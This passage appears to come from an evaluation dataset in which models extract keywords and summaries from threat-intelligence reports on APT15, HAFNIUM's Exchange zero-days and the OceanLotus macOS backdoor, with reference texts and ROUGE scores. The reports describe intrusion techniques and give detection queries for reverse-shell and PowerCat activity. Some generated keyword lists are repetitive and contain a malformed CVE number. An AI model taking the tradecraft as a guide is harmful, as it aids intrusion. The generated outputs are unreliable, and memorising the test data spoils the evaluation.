( /uk / about - us / privacy - policy / cookie - policy/ ) Accessibility ( /uk / about - us / accessibility/ ) [PERSON] Sitemap ( /uk / sitemap/ ) Latest from [ORG] @NCCGroupplc ( url [ORG] COOK , a provider of high - quality frozen meals , suspected that slow load times were negatively a\ufb00ecting its business . Download our case study for an in - depth analysis on how [ORG] NCC [ORG] Group measured and improved the performance of [ORG] COOK \u2019s website url us / resources / cook - real - user - monitoring - case - study/?resources = Case+Studies \u2026 ( url Reply ( url [PERSON] Retweet ( url ( url Despite the fact # GDPR ( url will be enforced from [DATE] May [DATE] 2018 , many organisations remain unclear on the topic of breach noti\ufb01cation under # GDPR ( url For best practice advice on how to communicate a personal data breach download our ebook now url breach - noti\ufb01cation - under - gdpr - how - to - communicate - a - personal - data - breach/ ? research = [ORG] Whitepapers \u2026 ( url\uf099Reply ( url [PERSON] Retweet ( url ( url", "generated_text": "May 2017; UK government; APT15; Ke3chang; Mirage; Vixen Panda; GREF; Playful Dragon; sensitive documents; a backdoor; BS2005; RoyalCli; RoyalDNS; the group; batch scripts; its persistence mechanism; the IE; COM interface; IWebBrowser2; Command; control; the domains; the IP address; Linode; Google Cloud; The domains; IP address infrastructure; a preference; the ASN AS63949; the group; the domains; IP address infrastructure; a number; similar possible domains; Linode; Google Cloud; a preference; the ASN AS63949; the backdoor; BS2005; use; batch scripts; its persistence mechanism; Windows Run Key; the nature; this technique; evade behavioural detection; this technique; a lack; sophistication; development capability; these tools; additional tools; a network scanning/enumeration tool; the archiving tool WinRAR; a bespoke Microsoft SharePoint enumeration and data dumping tool; a bespoke Microsoft SharePoint enum", "ref_text": "<START-1>APT15, also known as Ke3chang, Mirage, Vixen Panda GREF and Playful Dragon, is a sophisticated advanced persistent threat group that targeted UK government departments and military technology. The group expanded its arsenal during the incident, including new backdoors such as BS2005, RoyalCli, and RoyalDNS. RoyalCli injects commands into Internet Explorer to communicate with C&C servers. RoyalDNS uses DNS TXT records. APT15 used additional tools such as WinRAR, Mimikatz, and spwebmember for data extraction, keylogging, and enumeration. The group also conducted lateral movement through net command, mounting the C$ share of hosts, and manually copying files. APT15 used stolen VPN certificates to regain access after being ejected from the network. Analysis of cached IE web browser data revealed over 200 commands executed by APT15 during the intrusion. APT15 relies on living off the land tactics using native Windows tools for reconnaissance and lateral movement. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5523255813953488, "gpt3/lexical/rouge_rouge2": 0.22807017543859648, "gpt3/lexical/rouge_rougeL": 0.32558139534883723, "gpt3/lexical/rouge_rougeLsum": 0.32558139534883723, "gpt3_generated_text": ["In May 2017, NCC Group's Incident Response team responded to a network compromise involving the APT15, also known as Ke3chang, Mirage, Vixen Panda, GREF, and Playful Dragon, targeting a client that provides services to the UK government. During the analysis of the compromise, new backdoors were discovered, including RoyalCli and RoyalDNS, which appear to be an evolution of the traditional backdoor BS2005 used by APT15. These backdoors communicate with the attacker's command and control through Internet Explorer using the COM interface IWebBrowser2. The group was found to use batch scripts to install persistence mechanisms, potentially to evade behavioral detection. Additional tools recovered during the incident included network scanning/enumeration tools, WinRAR, and a Microsoft SharePoint enumeration and data dumping tool. APT15 also used keyloggers, a .NET tool to enumerate folders and dump data from Microsoft Exchange mailboxes, and Mimikatz to dump credentials and generate Kerberos golden tickets. After being ejected from the network, APT15 regained access via the corporate VPN solution using a stolen VPN certificate. This time, they used a DNS-based backdoor called RoyalDNS. Analysis of the commands executed by APT15 revealed their preference for \"living off the land\" by utilizing Windows commands for reconnaissance activities."]}, {"split_name": "val", "sample_id": "val_10", "prompt_text": "Extract the keywords: [CARDINAL] 3/12/2021HAFNIUM targeting Exchange Servers with 0 - day exploits - [PERSON] Microsoft [PERSON] SecurityHAFNIUM targeting [ORG] Exchange [ORG] Servers with 0 - day [DATE] exploitsmicrosoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-serversMarch 2 , [DATE] 2021Update [ 03/08/2021 ] : [ORG] Microsoft continues to see multiple actors taking advantage of unpatched systems to attack organizations with on - premises [PERSON] Exchange [PERSON] Server . To aid defenders in investigating these attacks where [ORG] Microsoft security products and tooling may not be deployed , we are releasing a feed of observed indicators of compromise ( IOCs ) . The feed of malware hashes and known malicious file paths observed in related attacks is available in both JSON and [ORG] CSV formats at the below [ORG] GitHub links . This information is being shared as TLP : WHITE.CSV format JSON formatUpdate [ 03/05/2021 ] : [ORG] Microsoft sees increased use of these vulnerabilities in attacks targeting unpatched systems by multiple malicious actors beyond [ORG] HAFNIUM . To aid customers in investigating these attacks , [ORG] Microsoft [ORG] Security [ORG] Response [ORG] Center ( [ORG] MSRC ) has provided additional resources , including new mitigation guidance : [ORG] Microsoft [ORG] Exchange [ORG] Server [ORG] Vulnerabilities [ORG] Mitigations \u2013 [DATE] March [DATE] 2021Update [ 03/04/2021 ] : The Exchange Server team released a script for checking [ORG] HAFNIUM indicators of compromise ( IOCs ) . [ORG] See [ORG] Scan [ORG] Exchange log files for indicators of compromise . [ORG] Microsoft has detected multiple 0 - day exploits being used to attack on - premises versions of [ORG] Microsoft [ORG] Exchange [ORG] Server in limited and targeted attacks . In the attacks observed , the threat actor used these vulnerabilities to access on - premises Exchange servers which enabled access to email accounts , and allowed installation of additional malware to facilitate long - term access to victim environments . [ORG] Microsoft [ORG] Threat [ORG] Intelligence [ORG] Center ( MSTIC ) attributes this campaign with high confidence to [ORG] HAFNIUM , a group assessed to be state - sponsored and operating out of [GPE] China , based on observed victimology , tactics and procedures . The vulnerabilities recently being exploited were CVE-2021 - 26855 , CVE-2021 - 26857 , CVE-2021 - 26858 , and CVE-2021 - 27065 , all of which were addressed in [DATE] today \u2019s [ORG] Microsoft [ORG] Security [ORG] Response [ORG] Center ( [ORG] MSRC ) release \u2013 [ORG] Multiple [ORG] Security [ORG] Updates [ORG] Released [ORG] for [ORG] Exchange [ORG] Server . We strongly urge customers to update on - premises systems immediately . Exchange Online is not affected . We are sharing this information with our customers and the security community to emphasize the critical nature of these vulnerabilities and the importance of patching all affected systems immediately to protect against these exploits and prevent future abuse across the ecosystem . This blog also continues our mission to shine a light on maliciousurl targeting [ORG] Exchange [ORG] Servers with 0 - day exploits - Microsoft Securityactors and elevate awareness of the sophisticated tactics and techniques used to target our customers . The related IOCs , [PERSON] Azure [PERSON] Sentinel advanced hunting queries , and [ORG] Microsoft [ORG] Defender for Endpoint product detections and queries shared in this blog will help SOCs proactively hunt for related activity in their environments and elevate any alerts for remediation . [ORG] Microsoft would like to thank our industry colleagues at Volexity and Dubex for reporting different parts of the attack chain and their collaboration in the investigation . Volexity has also published a blog post with their analysis . It is this level of proactive communication and intelligence sharing that allows the community to come together to get ahead of attacks before they spread and improve security for all . Who is [PERSON] HAFNIUM?HAFNIUM primarily targets entities in [GPE] the [GPE] United [GPE] States across a number of industry sectors , including infectious disease researchers , law firms , higher education institutions , defense contractors , policy think tanks , and NGOs . [ORG] HAFNIUM has previously compromised victims by exploiting vulnerabilities in internet- facing servers , and has used legitimate open - source frameworks , like [PERSON] Covenant , for command and control . Once they \u2019ve gained access to a victim network , [ORG] HAFNIUM typically exfiltrates data to file sharing sites like MEGA.In campaigns unrelated to these vulnerabilities , [ORG] Microsoft has observed [ORG] HAFNIUM interacting with victim Office 365 tenants . While they are often unsuccessful in compromising customer accounts , this reconnaissance activity helps the adversary identify more details about their targets \u2019 environments . [ORG] HAFNIUM operates primarily from leased virtual private servers ( VPS ) in [GPE] the [GPE] United [GPE] States . Technical detailsMicrosoft is providing the following details to help our customers understand the techniques used by [ORG] HAFNIUM to exploit these vulnerabilities and enable more effective defense against any future attacks against unpatched systems . CVE-2021 - 26855 is a server - side request forgery ( SSRF ) vulnerability in [ORG] Exchange which allowed the attacker to send arbitrary HTTP requests and authenticate as the [ORG] Exchange server . CVE-2021 - 26857 is an insecure deserialization vulnerability in the Unified Messaging service . Insecure deserialization is where untrusted user - controllable data is deserialized by a program . Exploiting this vulnerability gave [ORG] HAFNIUM the ability to run code as SYSTEM on the [ORG] Exchange server . This requires administrator permission or another vulnerability to exploit.url targeting [ORG] Exchange [ORG] Servers with 0 - day exploits - Microsoft SecurityCVE-2021 - 26858 is a post - authentication arbitrary file write vulnerability in [ORG] Exchange . If [ORG] HAFNIUM could authenticate with the [ORG] Exchange server then they could use this vulnerability to write a file to any path on the server . They could authenticate by exploiting the CVE-2021 - 26855 SSRF vulnerability or by compromising a legitimate admin \u2019s credentials . CVE-2021 - 27065 is a post - authentication arbitrary file write vulnerability in [ORG] Exchange . If [ORG] HAFNIUM could authenticate with the [ORG] Exchange server then they could use this vulnerability to write a file to any path on the server . They could authenticate by exploiting the CVE-2021 - 26855 SSRF vulnerability or by compromising a legitimate admin \u2019s credentials . Attack detailsAfter exploiting these vulnerabilities to gain initial access , [ORG] HAFNIUM operators deployed web shells on the compromised server . Web shells potentially allow attackers to steal data and perform additional malicious actions that lead to further compromise . [CARDINAL] One example of a web shell deployed by [ORG] HAFNIUM , written in ASP , is below : Following web shell deployment , [ORG] HAFNIUM operators performed the following post- exploitation activity : Using Procdump to dump the LSASS process memory : Using 7 - Zip to compress stolen data into ZIP files for exfiltration : Adding and using Exchange PowerShell snap - ins to export mailbox data : Using the Nishang Invoke - PowerShellTcpOneLine reverse shell : url targeting Exchange Servers with 0 - day exploits - [ORG] Microsoft [ORG] SecurityDownloading [ORG] PowerCat from [ORG] GitHub , then using it to open a connection to a remote server : [ORG] HAFNIUM operators were also able to download the [ORG] Exchange offline address book from compromised systems , which contains information about an organization and its users . Our blog , [ORG] Defending [ORG] Exchange servers under attack , offers advice for improving defenses against [ORG] Exchange server compromise . Customers can also find additional guidance about web shell attacks in our blog Web shell attacks continue to rise . Can I determine if I have been compromised by this activity?The below sections provide indicators of compromise ( IOCs ) , detection guidance , and advanced hunting queries to help customers investigate this activity using [ORG] Exchange server logs , [PERSON] Azure [PERSON] Sentinel , [ORG] Microsoft [ORG] Defender [ORG] for [ORG] Endpoint , and [ORG] Microsoft [ORG] 365 [ORG] Defender . We encourage our customers to conduct investigations and implement proactive detections to identify possible prior campaigns and prevent future campaigns that may target their systems . Check patch levels of [ORG] Exchange [ORG] ServerThe [ORG] Microsoft [ORG] Exchange [ORG] Server team has published a blog post on these new [ORG] Security [ORG] Updates providing a script to get a quick inventory of the patch - level status of on- premises [ORG] Exchange servers and answer some basic questions around installation of these patches . [ORG] Scan [ORG] Exchange log files for indicators of compromiseThe Exchange Server team has created a script to run a check for [ORG] HAFNIUM IOCs to address performance and memory concerns . That script is available here : url exploitation can be detected via the following [ORG] Exchange HttpProxy logs : These logs are located in the following directory : % PROGRAMFILES%\\Microsoft\\Exchange [ORG] Server\\V15\\Logging\\HttpProxy [ORG] Exploitation can be identified by searching for log entries where the [ORG] AuthenticatedUser is empty and the [ORG] AnchorMailbox contains the pattern of ServerInfo~*/*Here is an example [ORG] PowerShell command to find these log entries : Import - Csv [ORG] -Path ( Get - ChildItem -Recurse -Path \" $ env : PROGRAMFILES\\Microsoft\\Exchange Server\\V15\\Logging\\HttpProxy \" - Filter ' * .log').FullName | Where - Object { $ _ .AnchorMailbox -likeurl targeting Exchange Servers with 0 - day exploits - Microsoft Security'ServerInfo~*/ * ' -or $ _ .BackEndCookie -like ' Server~*/*~ * ' } | select [ORG] DateTime , [ORG] AnchorMailbox , [ORG] UrlStem , [NORP] RoutingHint , [ORG] ErrorCode , TargetServerVersion , BackEndCookie , [ORG] GenericInfo , [ORG] GenericErrors , [GPE] UrlHost , Protocol , [GPE] Method , [ORG] RoutingType , [ORG] AuthenticationType , ServerHostName , HttpStatus , BackEndStatus , [ORG] UserAgentIf activity is detected , the logs specific to the application specified in the [ORG] AnchorMailbox path can be used to help determine what actions were taken . These logs are located in the % PROGRAMFILES%\\Microsoft\\Exchange Server\\V15\\Logging directory . CVE-2021 - 26858 exploitation can be detected via the [ORG] Exchange log files : C:\\Program Files\\Microsoft\\Exchange [PERSON] Server\\V15\\Logging\\OABGeneratorLog [PERSON] Files should only be downloaded to the % PROGRAMFILES%\\Microsoft\\Exchange Server\\V15\\ClientAccess\\OAB\\Temp directoryIn case of exploitation , files are downloaded to other directories ( [ORG] UNC or local paths)Windows command to search for potential exploitation : findstr /snip /c:\"Download failed and temporary file \" \" % PROGRAMFILES%\\Microsoft\\Exchange Server\\V15\\Logging\\OABGeneratorLog\\*.log\"CVE-2021 - 26857 exploitation can be detected via the [ORG] Windows [ORG] Application event logsExploitation of this deserialization bug will create Application events with the following properties : Source : [ORG] MSExchange [ORG] Unified [ORG] Messaging EntryType : Error Event Message Contains : System . InvalidCastExceptionFollowing is [ORG] PowerShell command to query [ORG] the [ORG] Application [ORG] Event [ORG] Log for these log entries : Get - EventLog [ORG] -LogName Application -Source \" MSExchange Unified Messaging \" -EntryType Error | Where - Object { $ _ .Message -like \" * System . InvalidCastException * \" } CVE-2021 - 27065 exploitation can be detected via the following [ORG] Exchange log files : C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Logging\\ECP\\ServerAll Set-<AppName > VirtualDirectory properties should never contain script . [ORG] InternalUrl and [ORG] ExternalUrl should only be valid [GPE] Uris . Following is a [ORG] PowerShell command to search for potential exploitation : Select - String -Path \" $ env : PROGRAMFILES\\Microsoft\\Exchange Server\\V15\\Logging\\ECP\\Server\\*.log \" -Pattern ' Set-.+VirtualDirectory'url targeting Exchange Servers with 0 - day exploits - [ORG] Microsoft [ORG] SecurityHost IOCsMicrosoft is releasing a feed of observed indicators of compromise ( IOCs ) in related attacks . This feed is available in both [ORG] CSV and [ORG] JSON formats . This information is being [ORG] C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\ In [ORG] Microsoft [ORG] Exchange [ORG] Server installation paths such as:%PROGRAMFILES%\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\ C:\\Exchange\\FrontEnd\\HttpProxy\\owa\\auth\\The web shells we detected had the following file names : [ORG] web.aspx [ORG] one.aspxurl targeting [ORG] Exchange [ORG] Servers with 0 - day exploits - Microsoft SecurityCheck for suspicious .zip , .rar , and .7z files in [DATE] C:\\ProgramData\\ , which may indicate possible data exfiltration . Customers should monitor these paths for LSASS dumps : [PERSON] C:\\windows\\temp\\ [PERSON] C:\\root\\ToolsProcdump [PERSON] Nishang PowerCatMany of the following detections are for post - breach techniques used by [ORG] HAFNIUM . So while these help detect some of the specific current attacks that [ORG] Microsoft has observed it remains very important to apply the recently released updates for CVE-2021 - 26855 , CVE- 2021 - 26857 , CVE-2021 - 27065 and CVE-2021 - 26858.Microsoft [PERSON] Defender [PERSON] Antivirus detectionsPlease note that some of these detections are generic detections and not unique to this campaign or these exploits . Exploit : Script / Exmann . A!dha Behavior : Win32 / Exmann . A Backdoor : ASP / [ORG] SecChecker . A Backdoor : JS / [PERSON] Webshell ( not unique ) Trojan : JS / Chopper!dha ( not unique ) Behavior : Win32 / [ORG] DumpLsass . A!attk ( not unique ) Backdoor : HTML / TwoFaceVar . B ( not unique)Microsoft Defender for Endpoint detectionsSuspicious Exchange UM process creation [ORG] Suspicious [ORG] Exchange [ORG] UM file creation Possible web shell installation ( not unique ) Process memory dump ( not unique)Azure Sentinel detectionsAdvanced hunting queriesTo locate possible exploitation activity related to the contents of this blog , you can run the following advanced hunting queries via [ORG] Microsoft [ORG] Defender [ORG] for [ORG] Endpoint [ORG] and [ORG] Azure [ORG] Sentinel : url targeting Exchange Servers with 0 - day exploits - [ORG] Microsoft [ORG] SecurityMicrosoft [ORG] Defender for [ORG] Endpoint advanced hunting queriesMicrosoft 365 Defender customers can find related hunting queries below or at this [PERSON] GitHub location : url Queries / Additional queries and information are available via [ORG] Threat [ORG] Analytics portal for [ORG] Microsoft [ORG] Defender customers.UMWorkerProcess.exe in [ORG] Exchange creating abnormal contentLook for [ORG] Microsoft [ORG] Exchange [ORG] Server \u2019s Unified Messaging service creating non - standard content on disk , which could indicate web shells or other malicious content , suggesting exploitation of CVE-2021 - 26858 vulnerability : DeviceFileEvents | where InitiatingProcessFileName = = \" UMWorkerProcess.exe \" | where [ORG] FileName ! = \" [PERSON] CacheCleanup.bin \" | where [ORG] FileName ! endswith \" .txt \" | where [ORG] FileName ! endswith \" .LOG \" | where [ORG] FileName ! endswith \" .cfg \" | where [ORG] FileName ! = \" cleanup.bin\"UMWorkerProcess.exe spawningLook for [ORG] Microsoft [ORG] Exchange [ORG] Server \u2019s Unified Messaging service spawning abnormal subprocesses , suggesting exploitation of CVE-2021 - 26857 vulnerability : DeviceProcessEvents | where InitiatingProcessFileName = = \" UMWorkerProcess.exe \" | where [ORG] FileName ! = \" wermgr.exe \" | where [ORG] FileName ! = \" WerFault.exe\"Please note excessive spawning of wermgr.exe and [PERSON] WerFault.exe could be an indicator of compromise due to the service crashing during deserialization . Azure Sentinel advanced hunting queriesAzure Sentinel customers can find a [GPE] Sentinel query containing these indicators in [ORG] the [ORG] Azure [ORG] Sentinel [ORG] Portal or at this [PERSON] GitHub location : url Sentinel / tree / master / Detections / MultipleDataSources/.Look for Nishang Invoke - PowerShellTcpOneLine in Windows Event Logging : SecurityEvent | where EventID = = [CARDINAL] 4688 | where [ORG] Process has_any ( \" powershell.exe \" , \" PowerShell_ISE.exe \" ) | where [ORG] CommandLine has \" $ client = New - Object [ORG] System . Net . Sockets . TCPClient\"Look for downloads of [ORG] PowerCat in cmd and [ORG] Powershell command line logging in [ORG] Windows [ORG] Event [ORG] Logs : SecurityEvent | where EventID = = [CARDINAL] 4688 | where [ORG] Process has_any ( \" cmd.exe \" , \" powershell.exe \" , \" PowerShell_ISE.exe \" ) | where [ORG] CommandLine hasurl targeting [ORG] Exchange [ORG] Servers with 0 - day exploits - [ORG] Microsoft [ORG] Security\"url\"Look [ORG] for Exchange PowerShell Snapin being loaded . This can be used to export mailbox data , subsequent command lines should be inspected to verify usage : SecurityEvent | where EventID = = [CARDINAL] 4688 | where [ORG] Process has_any ( \" cmd.exe \" , \" powershell.exe \" , \" PowerShell_ISE.exe \" ) | where isnotempty(CommandLine ) | where [ORG] CommandLine contains \" Add - PSSnapin Microsoft . Exchange . Powershell . [PERSON] Snapin \" | summarize [ORG] FirstSeen = min(TimeGenerated ) , [CARDINAL] LastSeen = max(TimeGenerated ) by Computer , Account , [ORG] CommandLineurl", "generated_text": "Microsoft; HAFNIUM; organizations; the US; organizations; IP; vulnerabilities; Microsoft Security; Microsoft Updates; March 2021; CVE-2021-26855; CVE-2021-26858; CVE-2021-227065; DLL; access; email; accounts; DLLs; the attackers; targets; C2; encrypted Exchange files; a script; the exploits; the Exchange server; the attackers; C2 servers; the malware; Microsoft Defender; features; the exploits; risk; detection; mitigation; targeted attacks; tools.", "ref_text": "<START-1>The PDF describes attacks by a Chinese state-sponsored threat actor named HAFNIUM targeting on-premises Microsoft Exchange Servers. HAFNIUM exploited multiple 0-day vulnerabilities to gain initial access and install web shells for long-term persistence. The vulnerabilities exploited were CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065. Microsoft released patches and urged customers to update Exchange Servers immediately. Once compromised, HAFNIUM used tools like Procdump and PowerCat to dump credentials, download additional payloads, and exfiltrate data. They focused on entities in the US across sectors like infectious disease and law firms. Indicators of compromise and detection guidance are provided, including Exchange server logs to analyze, antivirus detections, and advanced hunting queries. The report aims to help security teams investigate potential compromise and defend against HAFNIUM. In summary, the PDF provides technical details on zero-day exploits used by HAFNIUM to compromise on-premises Exchange Servers and entrench access. It equips defenders with specific IOCs and detections to enable investigation and response. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.44230769230769235, "gpt3/lexical/rouge_rouge2": 0.14193548387096774, "gpt3/lexical/rouge_rougeL": 0.2692307692307692, "gpt3/lexical/rouge_rougeLsum": 0.2692307692307692, "gpt3_generated_text": ["The article discusses a recent attack on Microsoft Exchange Servers by a group called HAFNIUM, believed to be state-sponsored and operating out of China. The group exploited multiple zero-day vulnerabilities in the Exchange Server to gain access to email accounts and install additional malware. Microsoft has released security updates to address these vulnerabilities and urges customers to update their systems immediately. The attack primarily targeted organizations in the United States, including infectious disease researchers, law firms, higher education institutions, defense contractors, policy think tanks, and NGOs. HAFNIUM has a history of exploiting vulnerabilities in internet-facing servers and using legitimate open-source frameworks for command and control. Microsoft has observed the group interacting with victim Office 365 tenants, although they are often unsuccessful in compromising customer accounts. The article provides technical details of the vulnerabilities and offers resources for detection and mitigation."]}, {"split_name": "val", "sample_id": "val_11", "prompt_text": "Extract the keywords: MENUGet Support | [LANGUAGE] English [ change]Blog Home > Unit 42 > The New and Improved macOS Backdoor from [ORG] OceanLotusThe [ORG] OceanLotusBy [ORG] Erye [ORG] Hernandez and [PERSON] Danny [PERSON] Tsechansky [DATE] June 22 , [DATE] 2017 at [TIME] 10:00 [TIME] AM [TIME] Category : Unit 42 Tags : backdoor , macOS , [ORG] OceanLotus , threat intelligence1,759(2)Introduction Recently , we discovered a new version of the [ORG] OceanLotus backdoor in our [ORG] WildFire cloud analysis platform which may be one of the more advanced backdoors we have seen on macOS to date . This iteration is targeted towards victims in [GPE] Vietnam and still maintains extremely low AV detection [DATE] almost [DATE] a [DATE] year after it was \ufb01rst discovered . Despite having been in the wild for an extended period of time , the operation appears to still be active . During our   analysis , we were able communicate directly with the command and control server as recently as [DATE] early [DATE] June [DATE] 2017 . While there seem to be similarities to an [ORG] OceanLotus sample discovered in [DATE] May [DATE] 2015 , a variety of improvements have been made since then . Some of the improvements include the use of a decoy document , elimination of the use of command line utilities , a robust string encoding mechanism , custom binary protocol tra\ufb03c with encryption , and a modularized backdoor .    The new [ORG] OceanLotus backdoor is distributed in a zip \ufb01le . While we do n\u2019t have direct evidence for the initial infection vector we presume it \u2019s most likely   via an email attachment . Once the user has extracted the zip \ufb01le , they see a directory containing a \ufb01le with a Microsoft Word document icon . The \ufb01le is     actually an application bundle , which contains executable code . ( see Figure [CARDINAL] 1 ) . Once the user double clicks on the purported Word document , the [GPE] Trojan executes and then launches Word to display a decoy document . The malware uses the decoy document to help mask the execution of the malware . This technique is a common one for [PRODUCT] Windows - based malware , but rare on macOS . In order to achieve this layer of obfuscation , the malware author had to trick the operating system into believing the folder is an application bundle despite the .docx extension . Traditionally , macOS malware have emulated legitimate application installers such as [PERSON] Adobe [PERSON] Flash , which was how the previous version of [ORG] OceanLotus was packaged . Figure Once the application bundle is launched , it opens a hidden \ufb01le in the bundle \u2019s Resources folder named .CFUserEncoding which is a password - protected   Word document ( see Figure [CARDINAL] 2 ) . It also copies this \ufb01le to the executable path and essentially replaces the application bundle after persistence has been   set up . This would lead the victim to believe that nothing was amiss , as they thought they were opening a Word document and a Word document opened . In this case , the Word \ufb01le has the name \u201c Noi dung chi tiet.docx \u201d , which is [NORP] Vietnamese for \u201c [WORK_OF_ART] Details . \u201d Figure Compared to the previous version of this backdoor , the persistence mechanism for this remained largely the same . This version creates a [NORP] Launch Agent that runs when the victim host starts up , where as in the previous version execution was upon when a user logs in . It also copies itself to a di\ufb00erent   location and \ufb01lename based on the [ORG] UID of the user who ran the application .   For a user other than root , it takes the MD5 hash of the structure returned by getpwuid ( ) and breaks the hash down into segments < \ufb01rst of hash>-<next hash > . This segmented MD5 hash is prepended with \u201c 0000- \u201c then used as a directory in ~/Library / OpenSSL/ to store the executable \ufb01le ( see Figure [CARDINAL] 3 ) . If the user is root , the executable is stored in the system wide library directory at   /Library / TimeMachine / bin / mtmfs . It is interesting to note that the executable and plist locations look like legitimate applications . /Library / LaunchDaemons / com.apple.mtmfsd.plist ~/Library / LaunchAgents / com.apple.openssl.plistExecutable [ORG] Location [ORG] /Library / TimeMachine / bin / mtmfs ~/Library / OpenSSL/0000-<segmented MD5 Once the malware has set up persistence , it deletes the application bundle from the executable path leaving the decoy document in its place and launches itself as a service from the new location . [ORG] No [ORG] Command [ORG] Line [ORG] Utilities One of the \ufb01rst things we noticed about this backdoor is the lack of suspicious strings which often times provides context as to what the malware might   do on a victim host . In most macOS malware , calls to the system ( ) or exec ( ) functions to run additional scripts are in place . In this case , these were not present nor were there command line utility strings that may easily convey the malicious intention of the application . This shows a deep level of understanding of the macOS platform by the author of this backdoor compared to other threat actors that will commonly copy and paste scripts from the Internet . The lack of these strings may also double as an anti - analysis technique to make the malware seem less suspicious , especially to basic static analysis . String Decoding Since there appear to be no obvious suspicious strings in plaintext , we move onto the possibility of use of encoded , or obfuscated strings . The string decode routine for this backdoor is an upgrade from previous versions in which strings were XOR encoded with the word \u201c [WORK_OF_ART] Variable \u201d as a key . The string decode routine now consists of a combination of bit shifting and [PERSON] XOR operations with a variable key that depends on the length of the string that was encoded . If the computation for the variable [WORK_OF_ART] XOR key turns out to be 0 , the default XOR key of 0x1B is used . Figure [CARDINAL] 4 shows a Python implementation of the decode function . Figure After decoding the strings ( see Figure [CARDINAL] 5 ) , we can glean that the malware sets up persistence , surveys the victim \u2019s computer , and sends this information back to a server . At this point , it is still not obvious that this malware contains backdoor functionality . Figure Custom Binary Protocol and [ORG] Encrypted [ORG] Tra\ufb03c    The threat actors responsible for this malware appear to have spent some amount of e\ufb00ort to develop their own custom communication protocol . They   did not simply use an o\ufb00-the - shelf web server for their command and control server , as is commonly done . Instead , they created their own command   and control mechanism . The backdoor uses a custom binary protocol on [ORG] TCP port [CARDINAL] 443 , a well - known port that is unlikely to be blocked by traditional \ufb01rewalls due to its use in   [ORG] HTTPS connections . The packet seen in Figure [CARDINAL] 6 is encoded with a combination of bit shifting ( see Figure [CARDINAL] 7 ) and [WORK_OF_ART] XOR with a key of 0x1B before it is sent . The bits are always rotated to the left [CARDINAL] 3 times before doing the XOR operation . This is an improvement from the previous version where the packet was only XOR encoded with a key of 0x1B.Figure After decoding the packet , we can see a breakdown of di\ufb00erent \ufb01elds . Figure [CARDINAL] 8 shows the initial packet sent by the client to the server . It is relatively    empty aside from the \u201c magic \u201d bytes , length of data and type of communication . Figure Depending on the command response sent from the server , a packet may be bigger than 0x52 bytes . Data beyond 0x52 bytes is zlib compressed then encrypted with AES in CBC mode with a null initialization vector ( IV ) and a key sent from the server that is padded to [CARDINAL] 32 bytes . We captured live tra\ufb03c from the server , and observed that the encryption keys sent from the server are ephemeral . This means that each new session    with the server is given a di\ufb00erent key used to encrypt data sent back and forth within that session . This is a marked improvement compared to the   previous version , where only XOR encoding with a one - byte key was used for encryption . After decoding the packet it receives from the server , the backdoor validates certain \ufb01elds like the \u201c magic \u201d bytes and makes sure the length of the data   being received is not over a certain amount . Throughout the program execution , it also checks and handles any errors that may have been generated . [ORG] Command and [ORG] Control [ORG] Communications The command and control server communication sequence is as follows:1 . The client initiates a session with the server by sending a packet with 0x2170272 in the command \ufb01eld .   [CARDINAL] 2 . The server then responds with an ephemeral encryption key and a command . [CARDINAL] 3 . The client checks if the received packet from the server is valid . [CARDINAL] 4 . The client executes the command sent by the server and responds with a zlib compressed and [ORG] AES encrypted blob of the result then sends thisback to the server . Unlike the previous versions of [ORG] OceanLotus where the commands can be easily gathered from its strings , the author has obfuscated the functions with constant values . We decoded the following available commands as seen in Figure [CARDINAL] 9 . When the backdoor is launched , a \ufb01le is created in   /Library / Preferences/.\ufb01les   or ~/Library / Preferences/.\ufb01les   depending on the victim \u2019s user ID . This \ufb01le   ( see Figure [CARDINAL] 10 ) contains a timestamp and the victim \u2019s name concatenated with the machine \u2019s serial number which is then hashed twice with MD5 . This is then copied to a bu\ufb00er that is 0x110 bytes long and [ORG] AES encrypted in CBC mode with a null IV and a key of   \u201c pth \u201d . It is then saved into the \ufb01le . Command receive \ufb01le from server   get info on a \ufb01le / directory   delete \ufb01le / directory   ? ? ? execute function from a dynamic library send \ufb01le to server   ? ? ? send victim and computer information together with the backdoor \u2019s watermark execute a function from a dynamic library execute a function from a dynamic libraryTimestamp + MD5(MD5(<victim \u2019s name + machine serial number>))After this \ufb01le is created , the client sends its \ufb01rst packet to the server with 0x2170272 in the command \ufb01eld . The server acknowledges and responds with     the same command and the client veri\ufb01es that the \ufb01le has been created .   